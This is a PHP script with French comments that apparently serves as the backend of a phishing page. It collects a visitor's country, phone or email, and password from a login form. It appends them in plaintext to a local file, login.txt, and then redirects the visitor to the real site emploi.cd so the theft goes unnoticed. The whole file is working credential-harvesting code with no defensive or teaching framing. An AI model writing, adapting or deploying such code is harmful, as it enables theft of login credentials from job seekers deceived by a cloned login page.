<?php
// Vérifie si le formulaire a été soumis via la méthode POST
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Récupère et nettoie les données du formulaire
    $country = htmlspecialchars(trim($_POST["country"] ?? ''));
    $country_code = htmlspecialchars(trim($_POST["country_code"] ?? ''));
    $phone = htmlspecialchars(trim($_POST["phone"] ?? ''));
    $email = htmlspecialchars(trim($_POST["email"] ?? ''));
    $password = htmlspecialchars(trim($_POST["password"] ?? ''));
    $remember = isset($_POST["remember"]) ? "Oui" : "Non";

    // Détermine le username (phone ou email)
    $username = !empty($phone) ? $country_code . $phone : $email;

    // Vérifie si les champs obligatoires ne sont pas vides
    if ((!empty($phone) || !empty($email)) && (!empty($password) || empty($email))) {
        // Formate les données pour l'enregistrement
        $data = "Pays: $country\n";
        $data .= "Code pays: $country_code\n";
        $data .= "Téléphone: $phone\n";
        $data .= "Email: $email\n";
        $data .= "Mot de passe: $password\n";
        $data .= "Garder session: $remember\n";
        $data .= "-----------------------------\n";

        // Tente d'enregistrer les données dans le fichier 'login.txt'
        $file = "login.txt";
        if (file_put_contents($file, $data, FILE_APPEND)) {
            // Si l'enregistrement réussit, renvoie une réponse JSON pour le JavaScript
            header('Content-Type: application/json');
            echo json_encode([
                'success' => true,
                'message' => 'Données enregistrées avec succès',
                'redirect' => 'https://www.emploi.cd/'
            ]);
            exit();
        } else {
            // Message en cas d'erreur d'écriture
            header('Content-Type: application/json');
            echo json_encode([
                'success' => false,
                'message' => 'Erreur: Impossible d\'enregistrer les données'
            ]);
            exit();
        }
    } else {
        // Message si les champs sont vides
        header('Content-Type: application/json');
        echo json_encode([
            'success' => false,
            'message' => 'Erreur: Veuillez remplir tous les champs obligatoires'
        ]);
        exit();
    }
} else {
    // Message si le formulaire n'a pas été soumis
    header('Content-Type: application/json');
    echo json_encode([
        'success' => false,
        'message' => 'Erreur: Aucune donnée reçue'
    ]);
    exit();
}
?>
